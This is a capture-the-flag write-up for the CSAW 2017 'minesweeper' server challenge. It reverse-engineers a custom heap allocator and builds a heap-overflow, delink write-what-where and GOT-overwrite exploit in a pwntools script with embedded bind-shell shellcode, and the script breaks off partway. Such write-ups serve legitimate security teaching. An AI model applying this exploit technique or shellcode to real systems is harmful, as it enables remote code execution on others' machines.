# Csaw 2017 Minesweeper

Let's take a look at the binary:

```
$    pwn checksec minesweeper
[*] '/Hackery/pod/modules/custom_misc_heap/csaw17_minesweeper/minesweeper'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$    file minesweeper
minesweeper: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=90ec16e6be18b19942bf2952db17a7c1ed3ca482, stripped
$    ./minesweeper
Server started
```

So we can see that we are dealing with a `32` bit binary with none of the standard binary mitigations, and even `rwx` memory segments. We also see that the binary is some type of server. Let's try to connect to it:

```
$    netstat -planet
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    

.    .    .

tcp        0      0 0.0.0.0:31337           0.0.0.0:*               LISTEN      1000       149341     11035/./minesweeper      
$    nc 127.0.0.1 31337

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)
```

So we can see that the server listens on ip/port combo `0.0.0.0:31337`. When we connect to the server via netcat, we see that we are prompted

## Reversing

When we check the references to the strings, we find the function responsible for the main menu for our client:

```
undefined4 menu(undefined4 param_1)

{
  int local_30;
  int local_2c;
  undefined4 input;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  int bytesScanned;
  uint i;
  undefined5 *local_10;
 
  input = 0;
  local_24 = 0;
  local_20 = 0;
  local_1c = 0;
  local_10 = (undefined5 *)0x0;
  local_2c = 0;
  local_30 = 0;
  while( true ) {
    print(param_1,
          "\nHi. Welcome to Minesweeper. Please select an option:\n1) N (New Game)\n2) InitializeGame(I)\n3) Q (Quit)\n"
         );
    bytesScanned = customScan(param_1,&input,0x10);
    if (bytesScanned == -1) break;
    i = 0;
    while ((i < 0x10 &&
           ((*(char *)((int)&input + i) == ' ' || (*(char *)((int)&input + i) == '\0'))))) {
      i = i + 1;
    }
    if (i == 0x10) {
      print(param_1,"No command string entered! N, I, or Q please!\n");
    }
    else {
      switch(*(undefined *)((int)&input + i)) {
      case 0x49:
      case 0x69:
        local_10 = (undefined5 *)initGame(param_1,&local_2c,&local_30);
        break;
      default:
        print(param_1,"Invalid option, please try again N, I, or Q please!\n");
        break;
      case 0x4e:
      case 0x6e:
        newGame(param_1,local_10,local_2c,local_30);
        break;
      case 0x51:
      case 0x71:
        print(param_1,"Goodbye!\n");
        return 0;
      }
    }
  }
  print(param_1,"Goodbye!\n");
  return 0;
}
```

We can see that this function essentially just prompts us for our input. We are prompted with three options. The first is for a new game, the second is to initialize a game, and the third is to quit. When we take a look at the funcion responsible for initializing a game `initGame`, we see this:

```

char * initGame(undefined4 param_1,int *param_2,int *param_3)

{
  char *boardptr;
  void *hiTherePtr;
  void *menuPtr;
  char *Xptr;
  void *cowsayPtr;
  int iVar1;
  char local_3c [16];
  int bytesScanned;
  void *ptr0;
  uint i;
  int y;
  int x;
 
  print(param_1,
        "Please enter in the dimensions of the board you would like to set in this format: B X Y\n")
  ;
  x = customScan(param_1,local_3c,0x10);
  if (x == -1) {
    print(param_1,"Goodbye!\n");
    boardptr = (char *)0x0;
  }
  else {
    hiTherePtr = (void *)customMalloc(0xb);
    memset((int)hiTherePtr,0,0xb);
    memcpy(hiTherePtr,"HI THERE!!\n",0xb);
    print(param_1,hiTherePtr);
    customFree((int)hiTherePtr);
    menuPtr = (void *)customMalloc(1000);
    memset((int)menuPtr,0,1000);
    memcpy(menuPtr,
           "  +---------------------------+---------------------------+\n  |     __________________   |                           |\n  |  ==c(______(o(______(_()  ||\'\'\'\'\'\'\'\'\'\'\'\'|======[***  |\n  |             )=\\           | |  EXPLOIT  \\            |\n  |            / \\            | |_____________\\_______    |\n  |          /   \\           | |==[--- >]============\\   |\n  |          /     \\          ||______________________\\  |\n  |         / RECON \\         | \\(@)(@)(@)(@)(@)(@)(@)/  |\n  |        /         \\        |  *********************    |\n +---------------------------+---------------------------+\n                                                          \nIIIIII    dTb.dTb        _.---._       \n  II     4\'  v \'B   .\"\"\"\" /|\\`.\"\"\"\". \n  II     6.     .P  :  .\' / | \\ `.  : \n  II    \'T;. .;P\'  \'.\'  /  |  \\  `.\' \n  II      \'T; ;P\'    `. /   |   \\ .\'  \nIIIIII    \'YvP\'       `-.__|__.-\'     \n-msf                                   \n"
           ,1000);
    print(param_1,menuPtr);
    customFree((int)menuPtr);
    i = 0;
    while ((i < 0x10 && ((local_3c[i] == ' ' || (local_3c[i] == '\0'))))) {
      i = i + 1;
    }
    if (i == 0x10) {
      print(param_1,"Please send valid command! B X Y\n");
      boardptr = (char *)0x0;
    }
    else {
      if ((local_3c[i] == 'B') || (local_3c[i] == 'b')) {
        i = i + 1;
        if (i == 0x10) {
          print(param_1,"Not enough arguments to set board. B X Y\n");
          boardptr = (char *)0x0;
        }
        else {
          while ((i < 0x10 && ((local_3c[i] == ' ' || (local_3c[i] == '\0'))))) {
            i = i + 1;
          }
          if (i == 0x10) {
            print(param_1,"Not enough arguments to uncover. U X Y\n");
            boardptr = (char *)0x0;
          }
          else {
            y = 0;
            while ((((x = y, i < 0x10 && (local_3c[i] != ' ')) && (local_3c[i] != '\0')) &&
                   ((-1 < (int)local_3c[i] + -0x30 && ((int)local_3c[i] + -0x30 < 10))))) {
              y = (int)local_3c[i] + -0x30 + y * 10;
              i = i + 1;
            }
            if (i == 0x10) {
              print(param_1,"Not enough arguments to uncover. U X Y\n");
              boardptr = (char *)0x0;
            }
            else {
              while ((i < 0x10 && ((local_3c[i] == ' ' || (local_3c[i] == '\0'))))) {
                i = i + 1;
              }
              y = 0;
              while ((((i < 0x10 && (local_3c[i] != ' ')) && (local_3c[i] != '\0')) &&
                     ((-1 < (int)local_3c[i] + -0x30 && ((int)local_3c[i] + -0x30 < 10))))) {
                y = (int)local_3c[i] + -0x30 + y * 10;
                i = i + 1;
              }
              if ((x < 10000) && (y < 10000)) {
                boardptr = (char *)customMalloc((y + -1) * (x + -1));
                if ((y + -1) * (x + -1) < 0x1000) {
                  memset(boardptr,0,(y + -1) * (x + -1));
                  iVar1 = (x + -1) * (y + -1);
                  fprintf(stderr,"Allocated buffer of size: %d",iVar1);
                  do {
                    print(param_1,
                          "Please send the string used to initialize the board. Please send X * Ybytes follow by a newlineHave atleast 1 mine placed in your board, markedby the character X\n"
                          ,iVar1);
                    iVar1 = x * y + 1;
                    bytesScanned = customScan(param_1,boardptr);
                    if (bytesScanned == -1) {
                      print(param_1,"Goodbye!\n",iVar1);
                      return (char *)0;
                    }
                    Xptr = strchr(boardptr,0x58);
                  } while ((Xptr == (char *)0x0) || (x * y + 1 != bytesScanned));
                  cowsayPtr = (void *)customMalloc(200);
                  memset(cowsayPtr,0,200);
                  memcpy(cowsayPtr,
                                                  
                         "____________\n< cowsay <3 minesweeper >\n ------------          \n      \\   ,__,        \n        \\  (oo)____    \n           (__)    )\\  \n             ||--|| * \n"
                         ,0xa0);
                  print(param_1,cowsayPtr);
                  customFree((int)cowsayPtr);
                  *param_3 = y;
                  *param_2 = x;
                }
                else {
                  print(param_1,"Cannot allocate such a large board\n");
                  boardptr = (char *)0x0;
                }
              }
              else {
                print(param_1,"Dimension being set is too large\n");
                boardptr = (char *)0x0;
              }
            }
          }
        }
      }
      else {
        print(param_1,"Please send a valid command! B X Y\n");
        boardptr = (char *)0x0;
      }
    }
  }
  return boardptr;
}
```

Also let's take a look at the client / server output when this goes through function:

Client Output:
```
$    nc 127.0.0.1 31337

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)
I
Please enter in the dimensions of the board you would like to set in this format: B X Y
B 2 2
HI THERE!!
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |''''''''''''|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            / \            | |_____________\_______    |
  |           /   \           | |==[--- >]============\   |
  |          /     \          | |______________________\  |
  |         / RECON \         | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        /         \        |  *********************    |
  +---------------------------+---------------------------+
                                                           
IIIIII    dTb.dTb        _.---._       
  II     4'  v  'B   ."""" /|\`."""".
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'  
IIIIII     'YvP'       `-.__|__.-'     
-msf                                   
Please send the string used to initialize the board. Please send X * Y bytes follow by a newlineHave atleast 1 mine placed in your board, marked by the character X
X15935728
____________
< cowsay <3 minesweeper >
 ------------          
       \   ,__,        
        \  (oo)____    
           (__)    )\  
              ||--|| *

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)
Invalid option, please try again N, I, or Q please!

Hi. Welcome to Minesweeper. Please select an option:
1) N (New Game)
2) Initialize Game(I)
3) Q (Quit)
```

Server Output:
```
$    /minesweeper
Server startedNew user connecteddelinked!delinked!Allocated buffer of size: 1delinked!
```

So a few things, we can see that it prompts us for two variables an `x` and `y`. This is because this challenge is essentially a game where we have a board and have to find the mines on the board (hence the name minesweeper). This function we are initializing a new board, and the two dimensions for that are the `x` and `y` inputs we give it. However there are a lot of things here. First we can see that there is dynamic memory allocation happening but it is with a custom malloc / free (we will look closely at how the malloc works later):

Here is a custom malloc:
```
                boardptr = (char *)customMalloc((y + -1) * (x + -1));
```

Here is a custom free:
```
                  customFree((int)cowsayPtr);
```

However there are a few issues here. First we can see that the space it allocates is not `(x)*(y)`, but `(x - 1) * (y - 1)`. We can also see that it scans in `(x + 1) * (y + 1)` bytes worth of data in this instance. This gives us a pretty big heap overflow. Also when we take a look at the memory mappings, we see something interesting:

```
gef➤  set follow-fork-mode child
gef➤  r
Starting program: /Hackery/pod/modules/custom_misc_heap/csaw17_minesweeper/minesweeper
Server started[Attaching after process 11282 fork to child process 11297]
[New inferior 2 (process 11297)]
[Detaching after fork from parent process 11282]
[Inferior 1 (process 11282) detached]
New user connected
delinked!delinked!Allocated buffer of size: 1^C
Thread 2.1 "minesweeper" received signal SIGINT, Interrupt.
0xf7fd3939 in __kernel_vsyscall ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0xa       
$ecx   : 0xffffcf8c  →  0x00000004
$edx   : 0x0       
$esp   : 0xffffcf70  →  0xffffcfd8  →  0xffffd028  →  0xffffd078  →  0xffffd098  →  0xffffd0e8  →  0x00000000
$ebp   : 0xffffcfd8  →  0xffffd028  →  0xffffd078  →  0xffffd098  →  0xffffd0e8  →  0x00000000
$esi   : 0x0       
$edi   : 0xf7fb3000  →  0x001dbd6c
$eip   : 0xf7fd3939  →  <__kernel_vsyscall+9> pop ebp
$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffcf70│+0x0000: 0xffffcfd8  →  0xffffd028  →  0xffffd078  →  0xffffd098  →  0xffffd0e8  →  0x00000000     ← $esp
0xffffcf74│+0x0004: 0x00000000
0xffffcf78│+0x0008: 0xffffcf8c  →  0x00000004
0xffffcf7c│+0x000c: 0xf7ed7dfd  →  <recv+77> mov ebx, eax
0xffffcf80│+0x0010: 0x00000001
0xffffcf84│+0x0014: 0x00000000
0xffffcf88│+0x0018: 0xf7fb3000  →  0x001dbd6c
0xffffcf8c│+0x001c: 0x00000004
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd3933 <__kernel_vsyscall+3> mov    ebp, ecx
   0xf7fd3935 <__kernel_vsyscall+5> syscall
   0xf7fd3937 <__kernel_vsyscall+7> int    0x80
 → 0xf7fd3939 <__kernel_vsyscall+9> pop    ebp
   0xf7fd393a <__kernel_vsyscall+10> pop    edx
   0xf7fd393b <__kernel_vsyscall+11> pop    ecx
   0xf7fd393c <__kernel_vsyscall+12> ret    
   0xf7fd393d                  nop    
   0xf7fd393e                  nop    
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "minesweeper", stopped, reason: SIGINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd3939 → __kernel_vsyscall()
[#1] 0xf7ed7dfd → recv()
[#2] 0x8049a59 → add esp, 0x10
[#3] 0x80494c8 → add esp, 0x10
[#4] 0x80496b0 → add esp, 0x10
[#5] 0x8049b75 → add esp, 0x10
[#6] 0x8049d96 → add esp, 0x10
[#7] 0xf7df5751 → __libc_start_main()
[#8] 0x8048801 → hlt
────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x0804b000 0x00000000 r-x /Hackery/pod/modules/custom_misc_heap/csaw17_minesweeper/minesweeper
0x0804b000 0x0804c000 0x00002000 rwx /Hackery/pod/modules/custom_misc_heap/csaw17_minesweeper/minesweeper
0x0804c000 0x0804d000 0x00000000 rwx [heap]
0xf7dd7000 0xf7fb0000 0x00000000 r-x /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7fb0000 0xf7fb1000 0x001d9000 --- /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7fb1000 0xf7fb3000 0x001d9000 r-x /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7fb3000 0xf7fb5000 0x001db000 rwx /usr/lib/i386-linux-gnu/libc-2.29.so
0xf7fb5000 0xf7fb7000 0x00000000 rwx
0xf7fce000 0xf7fd0000 0x00000000 rwx
0xf7fd0000 0xf7fd3000 0x00000000 r-- [vvar]
0xf7fd3000 0xf7fd4000 0x00000000 r-x [vdso]
0xf7fd4000 0xf7ffb000 0x00000000 r-x /usr/lib/i386-linux-gnu/ld-2.29.so
0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/i386-linux-gnu/ld-2.29.so
0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/i386-linux-gnu/ld-2.29.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```

We can see here that the heap's memory permission is `rwx`, meaning that we can write code to it and execute it (this will come in handy later). Lastly we take a look at `newGame`, we see this:

```
void newGame(undefined4 parm0,undefined5 *parm1,int parm2,int parm3)

{
  undefined4 *puVar1;
  int __fd;
  ssize_t bytesRead;
  uint randVal;
  int iVar2;
  uint seed;
  undefined4 local_61;
  undefined4 uStack76;
  undefined4 input;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  int local_38;
  int local_34;
  int bytesRead1;
  int randomFile;
  uint i;
  int local_20;
  uint j;
  int arg3;
  int arg2;
  undefined5 *arg1;
 
  input = 0;
  local_44 = 0;
  local_40 = 0;
  local_3c = 0;
  local_61 = 0;
  uStack76 = 0;
  puVar1 = (undefined4 *)0x0;
  do {
    *(undefined4 *)((int)&local_61 + 1 + (int)puVar1) = 0;
    puVar1 = puVar1 + 1;
  } while (puVar1 < (undefined4 *)((int)&input - ((int)&local_61 + 1)));
  if (parm1 == (undefined5 *)0x0) {
    __fd = open("/dev/random",0);
    if (__fd == -1) {
      perror("Opening /dev/random failed!");
    }
    bytesRead = read(__fd,&seed,4);
    if (bytesRead < 1) {
      perror("Error reading /dev/random");
    }
    srand(seed);
    i = 0;
    while (i < 0x19) {
      *(undefined *)((int)&local_61 + i) = 0x4f;
      i = i + 1;
    }
    randVal = rand();
    *(undefined *)((int)&local_61 + randVal % 0x19) = 0x58;
    arg1 = &local_61;
    arg2 = 5;
    arg3 = 5;
  }
  else {
    arg1 = parm1;
    arg2 = parm2;
    arg3 = parm3;
  }
  print(parm0,
        "Welcome. The board has been initialized to have a random *mine*placed in the midst. Yourjob is to uncover it. You can:\n1) View Board (V)\n2) Uncover a location (U X Y). Zeroindexed.\n3) Quit game (Q)\n"
       );
  while (bytesRead1 = customScan(parm0,&input,0x10), bytesRead1 != -1) {
    j = 0;
    while ((j < 0x10 &&
           ((*(char *)((int)&input + j) == ' ' || (*(char *)((int)&input + j) == '\0'))))) {
      j = j + 1;
    }
    if (j == 0x10) {
      print(parm0,"Please enter a valid command! V, U, or Q\n");
    }
    else {
      switch(*(undefined *)((int)&input + j)) {
      case 0x51:
      case 0x71:
        goto LAB_08049050;
      default:
        print(parm0,"Please enter a valid command!\n");
        break;
      case 0x55:
      case 0x75:
        j = j + 1;
        if (j == 0x10) {
          print(parm0,"Not enough arguments to uncover. U X Y\n");
        }
        else {
          while ((j < 0x10 &&
                 ((*(char *)((int)&input + j) == ' ' || (*(char *)((int)&input + j) == '\0'))))) {
            j = j + 1;
          }
          if (j == 0x10) {
            print(parm0,"Not enough arguments to uncover. U X Y\n");
          }
          else {
            local_20 = 0;
            while ((((__fd = local_20, j < 0x10 && (*(char *)((int)&input + j) != ' ')) &&
                    (*(char *)((int)&input + j) != '\0')) &&
                   ((-1 < (int)*(char *)((int)&input + j) + -0x30 &&
                    ((int)*(char *)((int)&input + j) + -0x30 < 10))))) {
              local_20 = (int)*(char *)((int)&input + j) + -0x30 + local_20 * 10;
              j = j + 1;
            }
            if (j == 0x10) {
              print(parm0,"Not enough arguments to uncover. U X Y\n");
            }
            else {
              while ((j < 0x10 &&
                     ((*(char *)((int)&input + j) == ' ' || (*(char *)((int)&input + j) == '\0')))))
              {
                j = j + 1;
              }
              local_34 = local_20;
              local_20 = 0;
              while ((((j < 0x10 && (*(char *)((int)&input + j) != ' ')) &&
                      (*(char *)((int)&input + j) != '\0')) &&
                     ((-1 < (int)*(char *)((int)&input + j) + -0x30 &&
                      ((int)*(char *)((int)&input + j) + -0x30 < 10))))) {
                local_20 = (int)*(char *)((int)&input + j) + -0x30 + local_20 * 10;
                j = j + 1;
              }
              local_38 = local_20;
              if (local_20 < arg3) {
                if (__fd < arg2) {
                  __fd = __fd + local_20 * arg2;
                  if (*(char *)((int)arg1 + __fd) == 'X') {
                    print(parm0,"Mine found!\n");
                    printMaybe?(parm0,arg1,arg2,arg3);
                    return;
                  }
                  *(undefined *)((int)arg1 + __fd) = 0x55;
                  if ((__fd / arg2 != 0) && (__fd - arg2 != -1)) {
                    if (__fd / arg2 == 0) {
                      iVar2 = -1;
                    }
                    else {
                      iVar2 = __fd - arg2;
                    }
                    if (*(char *)((int)arg1 + iVar2) == 'X') {
                      print(parm0,"Mine found!\n");
                      printMaybe?(parm0,arg1,arg2,arg3);
                      return;
                    }
                    if (__fd / arg2 == 0) {
                      iVar2 = -1;
                    }
                    else {
                      iVar2 = __fd - arg2;
                    }
                    *(undefined *)((int)arg1 + iVar2) = 0x55;
                  }
                  if ((__fd / arg2 + 1 != arg3) && (arg2 + __fd != -1)) {
                    if (__fd / arg2 + 1 == arg3) {
                      iVar2 = -1;
                    }
                    else {
                      iVar2 = arg2 + __fd;
                    }
                    if (*(char *)((int)arg1 + iVar2) == 'X') {
                      print(parm0,"Mine found!\n");
                      printMaybe?(parm0,arg1,arg2,arg3);
                      return;
                    }
                    if (__fd / arg2 + 1 == arg3) {
                      iVar2 = -1;
                    }
                    else {
                      iVar2 = arg2 + __fd;
                    }
                    *(undefined *)((int)arg1 + iVar2) = 0x55;
                  }
                  if (((__fd + 1) % arg2 != 0) && (__fd != -2)) {
                    if ((__fd + 1) % arg2 == 0) {
                      iVar2 = -1;
                    }
                    else {
                      iVar2 = __fd + 1;
                    }
                    if (*(char *)((int)arg1 + iVar2) == 'X') {
                      print(parm0,"Mine found!\n");
                      printMaybe?(parm0,arg1,arg2,arg3);
                      return;
                    }
                    if ((__fd + 1) % arg2 == 0) {
                      iVar2 = -1;
                    }
                    else {
                      iVar2 = __fd + 1;
                    }
                    *(undefined *)((int)arg1 + iVar2) = 0x55;
                  }
                  if ((__fd % arg2 != 0) && (__fd != 0)) {
                    if (__fd % arg2 == 0) {
                      iVar2 = -1;
                    }
                    else {
                      iVar2 = __fd + -1;
                    }
                    if (*(char *)((int)arg1 + iVar2) == 'X') {
                      print(parm0,"Mine found!\n");
                      printMaybe?(parm0,arg1,arg2,arg3);
                      return;
                    }
                    if (__fd % arg2 == 0) {
                      __fd = -1;
                    }
                    else {
                      __fd = __fd + -1;
                    }
                    *(undefined *)((int)arg1 + __fd) = 0x55;
                  }
                }
                else {
                  print(parm0,"X parameter is out of range\n");
                }
              }
              else {
                print(parm0,"Y parameter is out of range!\n");
              }
            }
          }
        }
        break;
      case 0x56:
      case 0x76:
        printMaybe?(parm0,arg1,arg2,arg3);
      }
    }
  }
  print(parm0,"Goodbye!\n");
LAB_08049050:
  return;
}
```

The main thing from this we are going to need is this:

```
      case 0x56:
      case 0x76:
        printMaybe?(parm0,arg1,arg2,arg3);
```

It will allow us to print the data a board that we initialize. We will use this for an infoleak later.

#### Custom Malloc

Let's take a look at the custom malloc:

```
ushort * customMalloc(int size)

{
  uint realSize;
  ushort *chunk;
  ushort *maybeChunk;
 
  chunk = (ushort *)0x0;
  realSize = (size + 0xbU) / 0xc + 1;
  if (x == (ushort *)0x0) {
    x = &y;
    y = 0;
    z = &y;
    v = &y;
  }
  maybeChunk = *(ushort **)(x + 2);
  do {
    if (maybeChunk == x) {
LAB_0804991f:
      if ((chunk == (ushort *)0x0) || ((uint)*chunk != realSize)) {
        if (chunk == (ushort *)0x0) {
          chunk = (ushort *)sbrk(0x1000);
          if (chunk == (ushort *)0xffffffff) {
            return (ushort *)0xffffffff;
          }
          *chunk = 0x155;
        }
        if ((chunk == (ushort *)0x0) || ((uint)*chunk <= realSize)) {
          chunk = (ushort *)0xffffffff;
        }
        else {
          chunk[realSize * 6] = *chunk - (ushort)realSize;
          *chunk = (ushort)realSize;
          if ((*(int *)(chunk + 2) != 0) && (*(int *)(chunk + 4) != 0)) {
            delink((int)chunk);
          }
          linkMaybe(chunk + realSize * 6);
          chunk = chunk + 6;
        }
      }
      else {
        delink((int)chunk);
        chunk = chunk + 6;
      }
      return chunk;
    }
    if (realSize <= (uint)*maybeChunk) {
      chunk = maybeChunk;
      goto LAB_0804991f;
    }
    maybeChunk = *(ushort **)(maybeChunk + 2);
  } while( true );
}
```

Let's take a look at the custom free:

```
void customFree(int ptr)

{
  linkMaybe((ushort *)(ptr + -0xc));
  return;
}
```

Now let's take a look at the linking functionality:

```
void linkMaybe(ushort *ptr)

{
  ushort *ptr1;
 
  if (*(ushort **)(x + 2) == x) {
    *(ushort **)(ptr + 4) = x;
    *(ushort **)(ptr + 2) = x;
    *(ushort **)(x + 4) = ptr;
    *(ushort **)(x + 2) = ptr;
  }
  else {
    ptr1 = *(ushort **)(x + 2);
    while ((*ptr1 < *ptr && (ptr1 != x))) {
      ptr1 = *(ushort **)(ptr1 + 2);
    }
    *(ushort **)(ptr + 2) = ptr1;
    *(undefined4 *)(ptr + 4) = *(undefined4 *)(ptr1 + 4);
    *(ushort **)(*(int *)(ptr1 + 4) + 4) = ptr;
    *(ushort **)(ptr1 + 4) = ptr;
  }
  return;
}
```

Then finally let's take a look at the delinking functionality:
```
void delink(int ptr)

{
  undefined4 uVar1;
 
  uVar1 = *(undefined4 *)(ptr + 4);
  *(undefined4 *)(*(int *)(ptr + 4) + 8) = *(undefined4 *)(ptr + 8);
  *(undefined4 *)(*(int *)(ptr + 8) + 4) = uVar1;
  fwrite("delinked!",1,9,stderr);
  return;
}
```

So we can see how this custom heap is implemented. It allocates a chunk of memory using `sbrk`, and then uses the space for the heap. We can see that there is a binning mechanism for reusing freed chunks. However first let's look at the structure of a chunk for this custom heap:

```
0x0:    Size Parameter
0x4:    Fwd Pointer
0x8:    Bk Pointer
0xc:    Chunk Content
```

Also one thing, the size parameter isn't the value passed as an argument to the custom malloc, rather a value generated by running that through a function. When a chunk is freed, it is entered into a circular doubly linked list. A pointer to the head of the linked list is stored in the bss variable `x` at `0x804bdc4`. The `size`, `fwd`, and `bk` pointers are stored in the bss variables `y`, `z`, and `v` at bss address `0x804bdc8/0x804bdcc/0x804bdd0`:

```
gef➤  x/w 0x804bdc4
0x804bdc4:    0x804bdc8
gef➤  x/3w 0x804bdc8
0x804bdc8:    0x0    0x804c018    0x804c414
gef➤  x/3w 0x804c018
0x804c018:    0x55    0x804c414    0x804bdc8
gef➤  x/3w 0x804c414
0x804c414:    0xfe    0x804bdc8    0x804c018
gef➤  x/3w 0x804bdc8
0x804bdc8:    0x0    0x804c018    0x804c414
```

Also one last thing, when a function is delinked from the linked list, pointers are written to it's `fwd/bk` chunks to point to the other, to fill in the gap in the circle. We will use that later.

## Exploitation

So we have a somewhat large heap overflow. This is the plan. First we will leverage that and the ability to view a board for a heap infoleak. Proceeding that we will leverage the heap overflow to overwrite the `fwd` and `bk` pointers for a chunk in the doubly circular linked list for the binning mechanism of the custom heap. We will then have the chunk delinked, in which case since we control both pointers we will get a write what where. We will use that to do a `got` overwrite `fwrite` (since it is the first libc function called after the delink). We will then redirect code flow execution to our shellcode on the heap.

Also how I solved this challenged in terms of grooming the heap right included a bit of trial and error.

#### Heap Infoleak

For this, I just did a little trial and error until I got a board that would leak the information. I ended up going with a `3 x 4` bug with this type of memory layout:

```
gef➤  x/20w 0x0980700c
0x980700c:    0x31313158    0x31313131    0x31313131    0x12
0x980701c:    0x98070f0    0x804bdc8    0x5f5f5f5f    0x5f5f5f5f
0x980702c:    0x5f5f5f5f    0x63203c0a    0x6173776f    0x333c2079
0x980703c:    0x6e696d20    0x65777365    0x72657065    0x200a3e20
0x980704c:    0x2d2d2d2d    0x2d2d2d2d    0x2d2d2d2d    0x20202020
```

The specific leak I used was `0x98070f0` at `0x980701c`. With that we know the address space of both the heap and the binary (remember PIE isn't enabled).

#### Delink Attack

So this next part will be similar to an unsafe unlink. For this we will need to control the `fwd` and `bk` pointers of a chunk that is freed. Also something to note, by default none of our initialized chunks are freed, only the chunks that standard text is copied to. After trying to initialize boards of various sizes, we see something interesting. Looking at the linked list, we see that we got what we need. This is with a board size of `14 x 14` with some `2 x 2` board before it:

```
gef➤  x/3w 0x804bdc8
0x804bdc8:    0x0    0x97291f8    0x9729810
gef➤  x/3w 0x97291f8
0x97291f8:    0x28290002    0x9729210    0x804bdc8
gef➤  x/3w 0x9729210
0x9729210:    0x20200007    0x97290f0    0x97291f8
gef➤  x/3w 0x97290f0
0x97290f0:    0x30303030    0x30303030    0x30303030
```

We see that we were able to overwrite the `fwd` and `bk` pointers of a chunk, and this chunk is delinked later so it will suit our needs. Now it's just what pointers to write. Let's take another look at the delink code:

```
void delink(int ptr)

{
  undefined4 uVar1;
 
  uVar1 = *(undefined4 *)(ptr + 4);
  *(undefined4 *)(*(int *)(ptr + 4) + 8) = *(undefined4 *)(ptr + 8);
  *(undefined4 *)(*(int *)(ptr + 8) + 4) = uVar1;
  fwrite("delinked!",1,9,stderr);
  return;
}
```

So we can see that our `bk` pointer is written to the address pointed to by `fwd+8`, and that our `fwd` pointer is written to the address pointed to by `bk+4`. I set the `fwd` pointer equal to the got address of `fwrite` minus `0x8`, and the `bk` pointer equal to a little bit after the start of the heap chunk we used to overwrite these pointers (the start of our shellcode). Now with how this is set up, it will write a got address four bytes after the start of our shellcode. To combat this, I just added three nops and an extra instruction to effectively make the got pointer not do anything that would affect us, and immediately after it our shellcode will run.

Also one more thing I wanted to mention in another writeup but just forgot, there exists a stack pointer in the libc as part of the `environ` struct that points to environment variables.

## Exploit

Putting it all together, we have the following exploit:

```
from pwn import *

# Establish the server
server = process("minesweeper")
#gdb.attach(server, gdbscript = 'set follow-fork-mode child\nb *0x8048b7c')

# Establish remote connection to contact server as a client
target = remote("127.0.0.1", 31337)

# Establish the binary
elf = ELF("minesweeper")

# Establish interface functions
def recvMenu():
    print target.recvuntil("3) Q (Quit)\n")

def recvGame():
    print target.recvuntil("3) Quit game (Q)")

def initializeGame(x, y, content):
    recvMenu()
    target.sendline("I")
    print target.recvuntil("format: B X Y\n")
    target.sendline("B " + str(x) + " " + str(y))
    print target.recvuntil("character X\n")
    target.send(content)

def newGame():
    recvMenu()
    target.sendline("N")

def uncoverPiece(x, y):
    recvGame()
    target.sendline("U " + str(x) + " " + str(y))

def viewBoard(recv = None):
    if recv == None:
        raw_input()
    else:
        recvGame()
    target.sendline("V")

def quitGame(recv = None):
    if recv == None:
        raw_input()
    else:
        recvGame()
    target.sendline("Q")

# Make a board to get heap infoleak
initializeGame(3, 4, "X" + "1"*(19))

newGame()# I/O is a little weird
newGame()

# Get and parse out the infoleak, find base of heap
viewBoard(1)

print target.recvuntil("X11\n")
leak = target.recv(30)
leak = leak.strip("\n")
leak = u32(leak[17:19] + leak[20:22])
heapBase = leak - 0xf0

print "Heap Base: " + hex(heapBase)

quitGame()

# SO a little heap grooming
initializeGame(2, 2, "X" + "0"*(8))
newGame()

initializeGame(2, 2, "X" + "0"*(8))
newGame()

initializeGame(2, 2, "X" + "0"*(8))
newGame()



payload = ""
payload += "0"*0x20
# Some extra instructions to deal with the got address written 0x4 bytes after the start of our shellcode
payload += "\x90"*3 + "\x50" + "\x90"*8

# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-836.php
payload += "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x2b\x67\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80"
payload += "0"*(183 - len(payload))
payload += p32(elf.got["fwrite"] - 8) # fwd pointer
